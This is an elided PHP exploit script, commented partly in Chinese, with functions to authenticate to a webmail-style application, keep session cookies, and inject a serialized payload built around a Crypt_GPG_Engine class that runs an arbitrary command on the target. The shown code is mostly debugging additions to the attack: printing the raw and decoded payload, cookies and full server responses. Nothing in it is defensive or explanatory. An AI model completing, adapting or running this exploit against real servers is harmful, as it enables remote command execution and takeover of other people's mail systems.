...
function main(array $argv): void
{
    ...
    try {
        ...
        // 添加會話驗證
        if (!verifySession($targetUrl, $sessionCookie)) {
        ...
        debugPayload($command); // Debugging payload content
...
function authenticate(
    ...
    message("Using initial cookie: {$cookie}"); // 添加這行
    ...
    $newCookie = getCookie($respHeaders, $cookie); // 保留原始 cookie
    message("New session cookie: {$newCookie}"); // 添加這行
...
function injectPayload(string $targetUrl, string $cookie, string $payloadName, string $payloadFile): void
{
    ...
    message('Using cookie: ' . $cookie); // 添加這行來調試

    // 添加載荷調試信息
    message('Payload name: ' . $payloadName);
    message('Payload file: ' . $payloadFile);
    
    // 解碼載荷查看內容
    $decoded = urldecode($payloadName);
    message('Decoded payload: ' . substr($decoded, 0, 200) . '...');
    ...
    // 添加完整響應調試
    message('Full Response Headers: ' . $respHeaders);
    message('Full Response Body: ' . $response);
...
function verifySession(string $targetUrl, string $cookie): bool
{
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
    ...
    $response = @file_get_contents($targetUrl . '/?_task=settings', false, $context);
    return $response !== false && strpos($response, 'session_error') === false;
}
/**
...
function getCookie(string $headers, string $existing = ''): string
{
    ...
    // 解析現有 cookies
    if (!empty($existing)) {
        $existingPairs = explode(';', trim($existing, ';'));
    ...
    // 添加新的 cookies，使用更寬鬆的正則表達式
    if (preg_match_all('/Set-Cookie:\s*([^=]+)=([^;]*)/i', $headers, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $match) {
            $key = trim($match[1]);
            $value = trim($match[2]);
            if ($value !== '-del-' && $value !== 'deleted') {
                $cookies[$key] = $value;
            }
        }
    }
...
function calcPayload($cmd){
	...
	// 檢查類是否已存在，如果不存在才定義
    if (!class_exists('Crypt_GPG_Engine')) {
...
function debugPayload($cmd) {
    [$payloadName, $payloadFile] = calcPayload($cmd);
    
    echo "=== PAYLOAD DEBUG ===\n";
    echo "Command: $cmd\n";
    echo "Payload Name (raw): $payloadName\n";
    echo "Payload Name (decoded): " . urldecode($payloadName) . "\n";
    echo "Payload File: $payloadFile\n";
    echo "====================\n";
    
    return [$payloadName, $payloadFile];
}
